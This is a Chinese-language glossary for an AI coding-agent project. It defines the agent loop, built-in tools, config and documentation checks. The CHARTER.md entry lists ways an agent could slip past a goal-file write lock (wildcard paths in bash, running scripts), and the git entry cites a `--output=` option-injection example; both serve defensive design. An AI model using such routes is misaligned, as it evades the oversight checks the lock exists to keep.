# 📖 项目术语表

> 统一解释项目中出现的技术术语，供人和 AI 共同参考。

## A

### Agent
**本项目没有 Agent 类。** 运行实体是 [Runtime](#runtime)（持有全部子系统、对外提供 `prompt()`），三重循环在 [Agent Loop](#agent-loop) 里。

`types.ts` 里曾有个 `AgentConfig`（name / version）和一句“调用方：agent.ts”的注释，而该文件从未存在、全项目无人 import——属早期遗留，**已于 2026-09-03 删掉**。

参见：[Harness](#harness)、[Runtime](#runtime)、[Agent Loop](#agent-loop)

### Agent Loop
三重循环的执行体：契约在 `core/loop.ts`（`AgentLoopService` / `AgentLoopOptions` / `AgentLoopResult`），实现在 `loop/agent-loop.ts`（`AgentLoopServiceImpl`）。`Runtime.prompt()` 每轮调它，负责“发请求 → 收工具调用 → 执行工具 → 结果塞回去再发”，直到模型不再要工具。

两道稳健性保护：同一调用（工具名 + 规范化参数）连续失败 2 次就追加“换策略”提示；最后一轮之前注入收尾提示（写进度 + 返回已有结论）。

`AgentLoopResult.usage` 是各轮真值合计（L3 打通后不再估算）。`AgentLoopResult.turnLog`（2026-09-12）是本轮**实际生成**的中间消息切片（assistant+tool_calls / tool 结果，按发生顺序，最终回复不入内）——Runtime 据此把工具轮带 extra 落盘，循环自身一处 `appendMessage` 都没有（落盘是 Runtime 的编排职责）。

参见：[Runtime](#runtime)、[Usage](#usage用量)、[Span](#span行为段)、[turnLog](#turnlog本轮中间消息切片)

### archive（坐标归档工具）
`tools/builtin.ts` 里的**第 13 个**内置工具（2026-09-14 加）。把一个**项目坐标**（`.flint/ROADMAP.md` 里存在的编号）"走完"这件事**一次写成三处**：

① 追加 `.flint/DEVLOG.md`（**人读散文**，见 [DEVLOG.md](#devlogmd开发日志)）；② 往事件库记一条 `kind=system` 的**机读四段**（可 `search_events` 检索）；③ 把路线图里那个坐标标成 `已完成`（**只替换坐标表那几行，表外散文逐字不动**，落盘的是 `resolveStatuses` 算出的**权威状态**）。

**散文与四段刻意不互替**：散文进不了检索、四段字段读不出语气——写两处不是重复，是**两种读者**（人要顺序读一遍就明白发生了什么，机器要跨会话捞得出来）。

回执会**顺带提议下一坐标**（`nextCoord`：未开始 + 叶子 + 依赖已满足，按 `compareId` 取第一个）——把"要记得提议"变成"**躲不掉**"；提不出来时说清是**被依赖卡住**还是**已无未开始叶子**。**未命中就一字不落盘**：编号不存在 / 拿父坐标当叶子 / 路线图格式坏 → `[INVALID]`，且 DEVLOG、事件库、路线图**三处都不动**（与 `write` / `edit` 同一条原则）。它**不带 `requirePermission`**（系统行为，不必每坐标弹一次窗）、**不 import `io/`**（stdout 纯净规则）。

参见：[DEVLOG.md（开发日志）](#devlogmd开发日志) · [ask（分叉点提问工具）](#ask分叉点提问工具)

### ask（分叉点提问工具）
`tools/builtin.ts` 里的**第 12 个**内置工具（2026-09-14 加）。模型自认遇到**技术选型分叉点**时调用它，**截断当前行为**、把题抛给用户拍板——治的是"模型自己脑补一个方案往下冲，用户事后才发现方向选错了"。两条路：① 用户选定 → 模型把结论落进路线图 / CHARTER / DEVLOG；② 选「保留选项，先讨论」→ 走 [grill-me](#grill-me逼问式讨论技能)，聊完**重抛**分叉点。

**fail-closed 取向**（与权限弹窗的 fail-open 相反）：非 TTY 一律返回 null、**绝不自动替用户选一个候选**，让模型降级为文字提问——判据是"分叉点的全部价值就在别猜"。交互实现（`io/ui/fork-prompt.ts` 的 `createForkAsker`）**不进工具层**，改由 `main.ts` 注入 `AskFn` 接口，于是 `tools/builtin.ts` 不会拖进会写 stdout 的 `io/`（守 stdout 纯净规则）。少于 2 个候选直接 `[INVALID]`；两路收尾都往 `EventStore` 落 `kind=decision` 叙事；**不接权限系统**（不是危险操作）。

### Async Generator（异步生成器）
`async function*` + `yield` 构成的函数，每次 `yield` 暂停执行，等待消费者调用 `next()` 后继续。本项目 LLM 流式输出用的就是它——但对外暴露的是 [EventStream](#eventstream推拉通道)（`implements AsyncIterable`，内部用 `async *[Symbol.asyncIterator]()` 把队列转发出去），不是裸生成器。

### Autogen Block（生成区）
文档里用一对 HTML 注释划出的"这块归机器管"的区域：

```
<!-- BEGIN AUTOGEN:test-summary -->
18 套零依赖验证脚本、合计 **701 项**断言
<!-- END AUTOGEN:test-summary -->
```

（上面那三行是 TESTING.md 开头那块的实况渲染结果，只是照抄当时的；数字会随代码变，本文不参与机器校验。）

区间内容由 `npm run docs:sync`（`scripts/docs-sync.mjs`）从**实测真值**写入，人一个字不碰；`npm run verify` 对它是**只读**的（内容对不上就报红、绝不顺手改文件）。渲染器在 `scripts/autogen.mjs`，写与查**共用同一个 `syncText`** —— 所以两边定义不可能分家（代价是"渲染器自己写错"时两边一起错且静默，因此 `verify-doc-numbers.ts` 的 D9 段拿**手写的期望字符串**钉它，绝不让它自证）。

三条约束：

- **落盘的是渲染后的 Markdown，不是 `{{占位符}}`**：`Log/` 是给人**和** Agent 的 Read 工具直接读的，占位符会让两边都读到垃圾。这也正是它能与"零构建管线 / 零运行时依赖"共存的唯一原因——不需要模板引擎，标记本身是 HTML 注释、渲染时不可见。
- **只接管算得出来的事实**（套数 / 项数）。"为什么这样测""这个债为什么还留着"程序给不出来，必须由人或 AI 写；混进区块会被 `docs-sync` 覆掉。
- **同一个 id 可以出现多次**，内容由同一个渲染器给出（像编译产物可以出现在多个位置）。所以[去重](#document-number-check文档数字校验)针对的是**手抄**的副本，不是生成区。

于是 `Log/` 的纪律是**三分**的：**算得出来的** → 生成区（可多处）· **判断性的** → 手写（唯一落点）· **历史数字** → 冻结（追加日志，"当时全量 556 项"改了才是篡改历史）。

与它相对的是**手抄值**：由人或 AI 从别处看来、再打进文档的数字。判据不是"谁在写"，而是**"这个值有没有经过谁的脑子"**——经过了就会漏、会编、会漂（本仓库实测过两次）。

参见：[文档数字校验](#document-number-check文档数字校验) · [稳定锚点](#stable-anchor稳定锚点) · [docs:sync](#docssync文档同步命令)

## B

### Backpressure（背压）
消费者处理速度慢于生产者时，生产速度自然受抑制的机制。在 `for await...of` 中，循环体执行完才调 `next()` 取下一个值，天然实现背压。

## C

### Check
启动前检查阶段，位于 `harness/check.ts`。读取配置、创建 LLM Provider、验证环境。结果通过 `CheckResult` 注入 Runtime。

启动关键路径**已彻底断网**：连通性与模型列表探测都挪到后台，UI 出现之前不再等任何网络往返。配置坏到无法创建 Provider 时抛 `CheckFailureError`（携带诊断列表），Harness 打印红字后 `process.exit(1)`。

参见：[Harness](#harness)、[RuntimeOptions](#runtimeoptions)、[Diagnostic](#diagnostic诊断条目)

### CheckResult
`check()` 的返回值类型，定义在 `types.ts`：`llm`（已初始化的 Provider）、`config?`（LLMConfig，供 UI 展示模型名）、`diagnostics`（逐项检查结果）、`providerName`（激活供应商显示名，供后台网络探测的文案用）。由 `harness/index.ts` 接收后传入 `main()`。

### CLI 模式
Agent 内部持有 `while(true)` 循环、自驱动运行的交互方式。**本项目不是这种模式**：`Runtime` 既没有 `start()` 也没有 `stop()`，不持有任何循环。

对比：[Pi 模式](#pi-模式)（本项目采用的那种）

### CollectedSpan
消费端拿到手的**成品段**：一段已经结束、字段齐全、只读的行为记录（`name` / `spanId` / `turnId` / `seq` / `startedAt` / `durationMs` / `status` / `input` / `output`，异常时多一个 `error`）。契约在 `core/events.ts`，由 [SpanCollector](#spancollector段收集器) 配对产出。

`status` 四种：`ok` / `error` / `unclosed`（退出时仍未关门）/ `running`（还没出门，仅 `running()` 里出现）。

对比：[Span](#span行为段)（生产端手里那个还在跑的句柄）

### Compaction（上下文压缩）
历史太长时把早期对话摘要成一段，腾出上下文窗口。契约在 `core/compaction.ts`（`CompactionService`，Runtime 必注入子系统之一），实现在 `context/compaction.ts`；摘要的存放另有 `core/compaction-store.ts`（`CompactionStore`）——落在会话文件里（entry 树的 compaction entry），不塞进消息流。

两个入口共用一个压缩主体：`maybeCompact`（**阈值闸**，每轮请求前跑，超 20 条才压）与 `compactNow`（**强制**，fork 摘要用，见[带摘要从此继续](#带摘要从此继续)）。storage **每次调用显式传入**（2026-09-12 起）——runtime 会切换会话，构造期绑死会把摘要写进旧文件。

LLM 视图与文件内容的分界（2026-09-12 修复后成立）：文件 = append-only 完整历史；`getMessages()` 视图 = 最后一个 compaction 的摘要 + 保留窗口（最近 10 条），**只认最后一个**摘要（与 SystemPromptService 摘要层同一口径）。审计层（`getAllStored` / `getAllMsgIds`）不裁。

压缩本身也要调 LLM，走的是**非流式** `chat()`，并用 `trace('compaction', …)` 打卡成段。**已知缺口**：这条路径烧的 token 没有回流到 `totalUsage`（全文件无 `usage` 字样），所以 `/usage` 报的数偏少。

参见：[Span](#span行为段)、[Usage](#usage用量)

### Config（配置）
项目的运行参数文件，如 `package.json`、`tsconfig.json`。属于[项目元数据](#project-metadata项目元数据)的一类。

运行期配置由 `config/manager.ts` 统一读取，**四份文件 + 一条优先级链**（高 → 低）：环境变量（`apiKeyEnv` 指定）> 全局 `~/.flint/config.json` > 项目 `config/provider-keys.json`（密钥，gitignore）> 项目 `config/active-config.json`（当前激活，不含 key）> 代码默认。供应商预设另在 `config/providers.json`（公开可提交）。

测试可用 `FLINT_CONFIG` 环境变量把激活配置指向临时文件。

**没有 `config/api.json` 这个文件**（旧文档里这个路径是错的）。目前只有“密钥”分了三层存在域，供应商定义与 baseUrl 仍只在项目单一域（manager.ts 里记着这条 TODO）。

### CHARTER.md（目标契约文档）
cwd 下 `.flint/` 里的**生命周期三件套**之一（另两个是 `PROJECT.md` 现状快照、`DEVLOG.md` 开发记录）。它是**立项时的完整策划案**：目标 / 范围 / 验收标准 / **明确不做什么**。

三者的**修改策略刻意不同**——同容器必然打架，这是本仓"快照是函数、日志是事实"那条判据多出来的第三个维度：

| 文件 | 性质 | 改需许可？ | 允许的操作 |
|---|---|---|---|
| `.flint/CHARTER.md` 目标 | **契约** | **是**（立项后冻结） | 显式解锁 + 追加修订记录，绝不静默覆盖 |
| `.flint/PROJECT.md` 现状 | **快照** | 否 | 覆盖（描述的就是当下） |
| `.flint/DEVLOG.md` 开发 | **事实** | 否 | 追加（要更正就追加"以本条为准"） |

**这是全仓唯一一处"改需要许可"的东西**：`write` / `edit` 命中该路径会被 `before_tool_call` 钩子拒绝（实现在 `project/charter.ts` 的 `guardContractWrite`），唯一开门动作是 `/charter unlock`（会话级位，进程结束自动回锁）。它治的是 **goal drift** —— 目标若能被边做边改，最后交付的东西和立项时说好的那个就不是一回事。**为什么走独立通道而不接权限子系统**（权限是"弹窗放行 + 进 allowlist"，契约要的是"默认拒写"；混在一起会让一次"本次全部允许"把锁静默打开），见 DECISION_LOG 锚点 `log-2026-09-14-charter-lock`。

**bash 这条通道怎么堵**（2026-09-15，ROADMAP 10.9.2 第一步）：`bash` 能绕过 `write` / `edit` 直接改盘，而它的参数是一串**文本**、没有"目标路径"可以精确比对。故分两层——**L1 事前字面闸**（`mentionsContract`：命令串里出现 `charter.md` 这个名字就拒，不分读还是写，判据刻意粗）**+ L2 事后效果闸**（`contractDrifted`：跑完比对文件内容，锁定期间变了就回滚）。L1 拦不住的绕法（通配符拼路径、跑脚本去改）由 L2 兜住；回滚前先把被顶掉的那一版存进旁挂文件 `.flint/CHARTER.rejected.md`，使回滚**可逆**。完整理由见 DECISION_LOG 锚点 `log-2026-09-15-charter-bash-hole`。

**仍未做**：真正的"危险命令拦截"（命令串黑名单 + 二次确认）尚缺，且"二次确认"被 **C7** 挡着——`decodeDeny` 只有"放行/拒绝"两态。

参见：[Project Metadata（项目元数据）](#project-metadata项目元数据) · [Check](#check)

## D

### decodeChildOutput（子进程输出解码）
`tools/builtin.ts` 里的模块级函数（签名 `(raw: Buffer) => string`），`bash` 工具拿它把子进程的输出字节解成字符串。2026-09-04 新增，替掉改前的硬编码 GBK。

存在的理由是一句话：**进程之间传的是字节，不是字符串**。字节不带“我是谁的编码”这个属性，而**谁产生的输出决定编码**：

- **cmd.exe 内建命令**（echo / dir / type / chcp）走控制台代码页——中文 Windows = 936(GBK)，实测 `echo 中文测试` → `d6d0cec4b2e2cad4`
- **外部程序**（node / npm / git / tsc）走自己的编码，通常 UTF-8，实测同一句话 → `e4b8ade69687...`

所以同一条 `bash` 命令里两种编码都可能出现，硬编码任何一种都会错一半。改前硬编码 GBK，`node -e "console.log('编译通过')"` 返回“缂栬瘧閫氳繃”，而模型正是靠这段文本判断编译结果的。

**三层，顺序不能反**：先 UTF-8 **严格**解（`fatal: true`，解得通就是 UTF-8；纯 ASCII 是两者公共子集，怎么解都一样）→ 解不通再退平台代码页（win32 取 `'gbk'`，否则 UTF-8 宽容解）→ 连回退解码器本身都不可用时（Node 未带 full-icu 则 `new TextDecoder('gbk')` 抛 RangeError）还有一层 `raw.toString('utf-8')` 兜底。

两个易错点：

- **先试 GBK 会静默错**：GBK 字符集覆盖面极大（几乎所有双字节组合都“合法”），UTF-8 的中文字节会被解成另一串合法汉字——不报错、只是错。所以必须拿 `fatal: true` 的 UTF-8 当第一道门
- **兜底那一层是承重的**：改前解码器抛错会落在 handler 的 `try` 里，被报成 `[ERROR] 命令执行失败`——模型会去排查一个根本没坏的执行环境

**残留限制**：一条命令同时混两种编码时（如 `echo x && node y`），GBK 字节会让 UTF-8 严格解失败，于是整段按 GBK 解，外部程序那半会乱。逐段判编码要先按行切字节再分别试解，代价是可能把一行 UTF-8 中文误判成 GBK（同上理由），本轮定为不做。

参见：[grep（递归搜索工具）](#grep递归搜索工具)、[ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 2026-09-04 23:53 那块

### defineTool（工具定义构造器）
`tools/spec.ts` 的导出函数（2026-09-06 新增），`tools/builtin.ts` 用它造全部 6 个内置工具——全项目**唯一**构造 `ToolDefinition` 的地方。入参是 `{ name, description, spec, handler, requirePermission?, permissionDetail?, permissionKey? }`，产出里 `parameters` 与 `parse` 都从 [spec](#spec工具参数规格) 派生，`handler` 的入参类型也从它推出（`Infer<S>`）。

它换来的一件事：**参数名在源码里只剩 spec 里那一处**。改前 `grep` 的 `'pattern'` 在这一个工具里出现 7 次（其中 4 处是协议性的：description 文案 1、对象属性名 1、字符串字面量 2），而 TS 一处都不检查——校验件的 key 形参类型是 `string`，什么都能塞。把它写成 `'patern'`（漏一个 t），编译通过、测试不红，只在运行时让模型收到一句“patern 是必填参数”，而它手上的单子写的是 pattern。

两条边界要知道：

- **`permissionKey` / `permissionDetail` 没跟着泛型化**：权限确认发生在 `agent-loop` 调 `execute` **之前**，那时参数还没校验过，这两个成员拿的仍是未经 parse 的原始 args（`edit` 的 permissionDetail 里那句 `String(args.replaceAll)` 就是这么留下的、消不掉）
- **`handler` 那一行 `as` 是全项目唯一一次类型收窄**：`core/tools.ts` 的 handler 契约仍是 `Record<string, unknown>`。跟着泛型化就得给 `ToolDefinition` 加类型参数，而它是三个文件的公共词汇（core 的接口与 `ToolProvider.register` 入参、`registry.ts` 那个 Map 的值类型、`spec.ts` 的返回类型），改一处要跟改三处，换来的只是省掉这一行 `as`。收窄的正确性靠“execute 一定先跑 parse 再跑 handler”保证，这条接线由 `verify-spec.ts` ⑥ 段钉住

参见：[spec（工具参数规格）](#spec工具参数规格)、[ToolInputError](#toolinputerror参数不合法错误)

### Diagnostic（诊断条目）
统一“启动检查结果”与“运行时错误”的结构，UI 一套渲染（定义在 `types.ts`）：`level`（`pass` / `warn` / `fail`）、`item`（来源标识：config / apikey / network / models / model / tool / llm）、`message`（人类可读说明）。

`warn` 是可继续但明示，`fail` 是阻断。`check()` 产出启动诊断，运行时错误事件复用同一结构。

诊断子系统契约在 `core/diagnostics.ts`（`DiagnosticsService`），实现在 `diagnostics/service.ts`，`/diagnostics` 命令读它。

参见：[Check](#check)、[CheckResult](#checkresult)

### DI 容器（Dependency Injection Container）
自动组装依赖的工具。向容器声明"我要一个 Runtime"，容器自动查找 Runtime 的依赖（LLMProvider、SessionStorage）以及这些依赖的依赖，全部创建好后返回。在本项目中未使用——手动组装完全可控，DI 容器的隐式查找反而增加理解成本。

参见：[ARCHITECTURE.md](./ARCHITECTURE.md#决策-6不做-di-容器)

### DeepSeek Provider
`LLMProvider` 接口的 DeepSeek 实现（`src/llm/deepseek.ts` 的 `DeepSeekProvider`）。`chat()` 返回 `ChatResult`、`stream()` 返回 `EventStream<LLMStreamEvent>`；OpenAI 兼容路径的公共逻辑在 `llm/stream-helper.ts`（`createChat` / `createSSEStream` / `resolveThinkingEnabled`）。

工厂是 `llm/index.ts` 的 `createProvider(config)`：`provider === 'anthropic'` → `AnthropicProvider`，**其余一律** → `DeepSeekProvider`（兼容 deepseek / openai / opencode-go / 自定义）。所以实现只有两个，`llm/types.ts` 注释里提到的 Ollama **尚未实现**。

参见：[LLMProvider](#llmprovider)、[Provider（供应商）](#provider供应商)、[EventStream](#eventstream推拉通道)

### Document（文档）
记录项目状态和历史的信息文件。属于[项目元数据](#project-metadata项目元数据)的一类。

本项目全在 `Log/` 下，分**两类，维护方式完全不同**：

- **append-only 日志**（`CHANGE_LOG.md` / `ARCHITECTURE_LOG.md` / `DECISION_LOG.md` / `ROADMAP.md`）：只追加、不改写旧条目，所以**天生不会过期**
- **现状快照**（`目录.md` / `ARCHITECTURE.md` / `TESTING.md` / `GLOSSARY.md`）：描述“现在是什么样”，**必须每轮跟着代码改**，一旦漏了就悄悄失真

另有五份规则书 `Log/*_RULES.md` 约定各日志怎么写。（旧文档里写的 `CHANGELOG.md` 是错的文件名，实际是 `CHANGE_LOG.md`。）

**快照里的数字**（套数 / 项数这类"当前真值"）自 2026-09-11 起有机器兜底：[文档数字校验](#document-number-check文档数字校验)。锚点也从"标题文字算出"改成"新条目带[稳定锚点](#stable-anchor稳定锚点)"。

### Document Number Check（文档数字校验）
`scripts/check-doc-numbers.mjs`：拿 `run-verify` 汇总出的**真值**去比对 `Log/` 里写的「当前值」。它查**两块**：

- **白名单（手抄值）**——只查明确写着"现在是多少"、且算不出或划不进生成区的那些位置。**2026-09-11 去重之后只剩 11 处，全在 TESTING.md**：第四节"全量 N 套"与"`.ts` 的 N 套"、第七节"N 项覆盖了什么"、第三节的**写法分布**（几套用 `assert` / `check` / `ok`、几套用哪种退出码）与它的**逐套表格**。
- **[生成区](#autogen-block生成区)（AUTOGEN）**——用**同一个 `syncText`** 算期望值再比文件内容（写与查共用一份模板，两边定义不可能分家）。修它要显式跑 `npm run docs:sync`。

**为什么必须白名单**：`\d+ 套 / \d+ 项` 在追加日志里成片出现，那些是**历史事实**（"当时全量 556 项"），改了才是篡改历史快照。盲扫会让校验永久红，而永久红的检查等于没有。

**为什么不算一套套件、也不计入项数**：名字用 `check-` 前缀，不匹配串跑入口的 `^verify-.+\.(ts|mjs)$`；并且由 `run-verify.mjs` 在汇总之后调用、独立汇报一行（`文档数字：N 处一致。`）。若把它算进去，"总项数对不对"就取决于"有没有把校验自己算进去"——成了自指。

**2026-09-11 第二轮：23 → 11 处**。上一轮把每一处手抄都加进名单**看着**，治的是症状；病根是**同一份事实被抄了 23 份**。于是这一轮两路收口：**去重**（`ARCHITECTURE.md` 的测试行与债 5、`目录.md` 的职责表与 `scripts/` 树的逐套项数、`ROADMAP.md` 已完成表末行 → 全部改成对 TESTING 的引用）与**生成区**（顶部套数 / 项数交给 `docs-sync`）。去重还**删掉了"ROADMAP 只认末次匹配"那条特判**：它本是穿着快照外衣的追加日志——改一次测试若不算里程碑就不会新增一行，末行随即变成"过期的现状"，逼人回头**改写历史行**；现在整张表被声明为**历史记账**，一律不查。

**上线首跑即见效**：点名 18 处漂移；并顺带查出 TESTING 第三节两处**既有**错数（`check` 写 8 实际 10——2026-09-10 加 `verify-steering.ts` 时漏了那一行；`if (failed > 0) process.exit(1)` 写 1 实际 2），而四个变体之和 5+3+7+1=16 恰好等于当时的 `.ts` 套件数，于是两处错得很安静。第二轮又靠它改正一处**叙事**错数：`verify-docs.mjs` 的"14 → 17"实为 18。

参见：[ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md#log-2026-09-11-doc-number-check)（第一轮）· [2026-09-11 14:14 那块](./ARCHITECTURE_LOG.md#log-2026-09-11-autogen)（去重 + 生成区）· `scripts/verify-doc-numbers.ts`（43 项，含四组变异测试）

### DEVLOG.md（开发日志）
cwd 下 `.flint/` 里的[生命周期三件套](#chartermd目标契约文档)之一（另两个是 `CHARTER.md` 目标契约、[`PROJECT.md`](#projectmd现状快照) 现状快照）。每完成一个坐标追加一节，每节回答四个问题：**前后区别 / 意义 / 影响面 / 遗留**（外加可选的"验证证据"）。

**为什么四段固定、不做自由散文**：自由散文在这类记录上很容易退化成流水账（"改了 A、改了 B、跑通了"）；四段逼着写的人回答四个**不同**的问题——改变了什么 / 为什么值得 / 牵动了谁 / 还剩什么。形状固定还有个副作用是好事：一眼能看出**哪一段被跳过了**。但**空段不写空标题**——写了 `**遗留**：` 后面跟一片空白，等于告诉读者"这里本该有内容"。

**只追加**：与 `Log/` 的追加日志同一纪律——历史条目**冻死**，要更正就再追加一条"以本条为准"，绝不改写旧节。写入方是 [`archive` 工具](#archive坐标归档工具)（`project/lifecycle.ts` 的 `renderDevlogEntry` 纯函数排版，其返回值**就是文件里那一段**）。

参见：[archive（坐标归档工具）](#archive坐标归档工具) · [CHARTER.md（目标契约文档）](#chartermd目标契约文档)

### docs:sync（文档同步命令）
`npm run docs:sync`（`scripts/docs-sync.mjs`）：跑完全部验证套件拿到**实测真值**，再把它写进 `Log/` 的[生成区](#autogen-block生成区)。

**为什么它必须真跑一遍、不读缓存**：缓存会过期，而过期的数字正是这套机制要消灭的东西——宁可慢，不要一个"看起来新、其实是旧"的数。

**为什么它是单独一条命令**：见[生成区](#autogen-block生成区)第二条约束——`verify` 只读（`gofmt -l` 范式），写盘必须由人显式按下。另外它在**结构问题**（标记不配对 / id 未知 / 一个生成区都没有）或**套件没全绿**时**拒绝写盘**：拿一份红的实测值去写文档，等于把错误固化进"当前值"。

真值采集在 `scripts/collect-stats.mjs`，与 `run-verify.mjs` 共用同一份（否则"真值"会有两个版本，而真值分家正是这套机制要消灭的东西）。

参见：[生成区](#autogen-block生成区) · [Document Number Check](#document-number-check文档数字校验)

## E

### edit（精准编辑工具）
`tools/builtin.ts` 里的第 6 个内置工具（前 5 个：ls / read / write / grep / bash）。**四步**：读全文 → 数 `oldText` 命中次数 → `indexOf` + 字面切片拼接替换 → 按字节写回（保住行尾、编码与 BOM）。与 `write` 的分工：只改一小段用 `edit`，新建文件或整篇重写才用 `write`——重抄全文会把没打算改的地方一并改掉。

值钱的地方不在“会替换”，在**肯拒绝**。按命中次数三分流：

- **0 次** → 拒绝、文件一字不动，回 `[ERROR]` + 文件行数 + “先 read 看清原文”。模型记错原文时，任何“猜”都是破坏
- **1 次** → 替换、写回
- **多次** → 拒绝（除非显式传 `replaceAll: true`），回**候选行号**。“改第一处”是最危险的行为——它会静默改错地方，模型和用户都看不出来

三条实现约束值得记住：

- **不用正则**：`oldText` 里满是 `. * ( [ ?` 等元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”
- **定位失败的前缀必须是 `[ERROR]`**：`agent-loop.ts` 把 `[ERROR]` / `[VERIFY_FAILED]` / `[INVALID]` 记作失败（第三个前缀是 2026-09-05 补的，本行早先写的“只把两个前缀记作失败”已失真），而“重复失败保护”只在失败时计数（第 2 次同样调用就追加系统提示叫模型别原样重试、先去 read 确认）。改成 `[NO_MATCH]` 这类软前缀等于把这层保护关掉
- **CRLF 往返只对纯 CRLF 文件做**：`core.autocrlf=true` 检出的源码是 CRLF，而模型发来的 `oldText` 必然用 `\n`，不归一化则跨行匹配必然 0 命中；混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）

参见：[permissionDetail](#permissiondetail权限弹窗文案)

### Event Subscription（事件订阅）
通过 `subscribe(handler)` 注册事件处理器，`emit(event)` 触发通知的模式。Pi 的 `prompt()` 返回 `void`，回复通过事件流传递。

本项目**两者都有**：`prompt()` 返回 `Promise<string>`（完整回复文本），同时全过程通过 [EventBus](#eventbus事件总线) 广播事件。UI 走的是后者。

对比：[OnToken Callback](#ontoken-callback)

### EventStream（推拉通道）
`runtime/event-stream.ts` 的 `class EventStream<T, R = void> implements AsyncIterable<T>`：生产端往里投、消费端 `for await` 取，内部用 `async *[Symbol.asyncIterator]()` 把队列转发出去（[Async Generator](#async-generator异步生成器) 说的机制就在这儿）。`LLMProvider.stream()` 返回的就是 `EventStream<LLMStreamEvent>`。

事件类型：`token`（正文片）/ `reasoning`（思维链片，不进 fullText）/ `thinking_block`（Anthropic 完整块，供下轮回放）/ `tool_call` / `end`（带 `usage?`）。

对比：[EventBus](#eventbus事件总线)（那个是全局广播，这个是单次调用的一对一通道）

### EventBus（事件总线）
`core/events.ts` 的契约，实现在 `runtime/events.ts` 的 `PromptEventEmitter`。`emit()` 只做两件事：给事件盖上公共头（`at` / `seq` / `turnId`），再**同步**广播给订阅者。它自己不配对、不落盘、不上屏——那些全是订阅者的事。

两把钥匙，区别很大：

- `subscribe(handler)`：通配收**全量**事件，返回值没人收——**只看**
- `on(type, handler)`：精确监听某一类事件，返回值经 `emitHook` 收回——**能改写流程**

事件类型另见 [PromptEvent](#promptevent)（该条曾长期标着“计划中”，现已校准为落地现状）。

参见：[Hook](#hook钩子扩展)、[Watcher](#watcher旁观扩展)、[Span](#span行为段)

### Extension（扩展）
放在 `src/extensions/` 下、由 `context/extension-loader.ts` 自动扫描装载的文件。**三类目录、三条口子**，区别只在注册函数拿到的 ctx 给了哪把钥匙：

- `sections/` → `registerSections(ctx)`，ctx = `{ addSection }`：往系统提示词加段落
- `hooks/` → `registerHooks(ctx)`，ctx = `{ on, events }`：**可改写流程**
- `watchers/` → `registerWatchers(ctx)`，ctx = `{ events }`：**只订阅，改不了**

watcher 的 ctx 里刻意不给 `on`——“旁观者改流程”在类型层面就不可能，不靠注释提醒也不靠使用自觉。

参见：[Hook](#hook钩子扩展)、[Watcher](#watcher旁观扩展)

## G

### Generator（生成器）
`function*` + `yield` 构成的函数。详见 [TS/生成器与异步生成器](../TS/生成器与异步生成器.md)（注：该链接指向仓库外的个人笔记库，仓库内无此文件）。

### git（只读结构化工具）
`tools/builtin.ts` 里的**第 14 个**内置工具（2026-09-14 加，ROADMAP 10.5.1）。把 `git status / diff / log / branch` 的**文本输出**翻成结构化结果、再渲染成人话，模型不必对着 porcelain 两字母码猜。

**与 `bash` 的分工是刻意的**：bash 万能但危险——它能改一切，所以必须弹窗，且**授权边界是整条命令**，模型顺手拼一条 `git status && git commit -m x`，读与写就**绑进了同一次授权**；`git` 窄但安全——**op 是白名单**（只有四个取值）+ **命令走 argv 数组、不经 shell**，因此**只读不弹窗**（与 ls / read / grep 同取位）。

三条设计要点：① `target` 以 `-` 开头一律拒——它落在 `--` **之前**、是 git 的**选项位置**，`git diff --output=文件 --numstat` 能把结果写进磁盘（argv 免疫 shell 注入，但免疫不了"被当成选项"这一路）；② 一律用 `-z`——`core.quotepath=false` 只管**转义**不管**引号**，非 `-z` 时含空格的中文路径仍被双引号包住；③ 解析口径**全部来自探针实测**而非文档（`-z` 下重命名占**两段**、`branch --format` **不认** `%x1f`、空仓库跑 `log` 的 128 退出**不算故障**）。

解析与渲染在 `src/git/git.ts`（**零 import 纯函数**，可脱离终端验）；起进程、解码、截断在工具层。**写操作不在**这里。

参见：[decodeChildOutput](#decodechildoutput子进程输出解码) · [archive（坐标归档工具）](#archive坐标归档工具)（它的"前后区别"以本工具为事实来源） · [依赖环（Dependency Cycle）](#依赖环dependency-cycle)

### grep（递归搜索工具）
`tools/builtin.ts` 里的第 4 个内置工具（ls / read / write / **grep** / bash / edit）。返回“路径:行号:该行内容”，`pattern` 按 **JS 正则**编译。不需权限确认（只读）。

**纯 Node 实现，不 shell 出去**（2026-09-04 改）。改前拼的是 POSIX 串 `grep -rn ... 2>/dev/null | head -50`，而 `execSync` 在 Windows 走 `cmd.exe`：`grep` 不存在、`2>/dev/null` 被当成路径，于是在中文 Windows 上**一次也搜不到**；更糟的是失败被报成 `[NO_MATCH]`，搜一个确实存在的符号与搜一个绝不存在的串返回一模一样。工具自己的 description 还写着“基于 ripgrep (rg) 或系统 grep”，而代码里两者都没有。

**返回前缀是分类契约，不是文案**（`agent-loop.ts` 把 `[ERROR]` / `[VERIFY_FAILED]` / `[INVALID]` 记作失败，`NO_MATCH` / `NOT_FOUND` / `EMPTY` 归为“有效否定（不计失败）”）。改前把“命令跑不起来”也报成 `[NO_MATCH]`，等于把这层保护关掉：

| 前缀 | 含义 |
|------|------|
| `[OK]` | 真命中，附命中数与“已扫 N 个文件” |
| `[NO_MATCH]` | 扫完了、确实没有 |
| `[INVALID]` | 正则编译不了，或 include 过滤模式无法编译；**参数级的那几条**（缺 `pattern` / 传了非字符串 / 传了不存在的参数名）自 2026-09-06 起由 `registry.execute()` 的 [parse](#spec工具参数规格) 在进 handler **之前**报出（改前是 handler 里的 `requireString`），缺参那句文案逐字未变、另两种是新拦的。两类都**计入失败**（2026-09-05 起） |
| `[NOT_FOUND]` | 搜索路径不存在 |
| `[ERROR]` | 其他意外（计入失败、会触发重复失败保护） |

**“已扫 N 个文件”是承重的**：0 命中时模型需要能区分“扫了 300 个文件确实没有”与“自己的 include 把所有文件都排除了”——后者是它自己写错了参数，但两种情形看上去都是“空结果”。这个信息 shell 版拿不到（系统 `grep` 不报它跳过了什么）。

**上限与跳过规则**（全是硬编码常量，不可注入）：`.git` / `node_modules` / `dist` 与点开头目录、头部 8KB 内有 NUL 字节的二进制文件（不跳的话一个 .png 能把 50 个名额吃光）、>2MB 的超大文件、5000 个文件总量上限（防误指向盘符根目录）、50 命中上限。`include` 只认 `*` `?` `{a,b}`，不支持 `**` 与字符类 `[abc]`；编译不了时显式报 `[INVALID]`，而不是静默过滤掉一切。

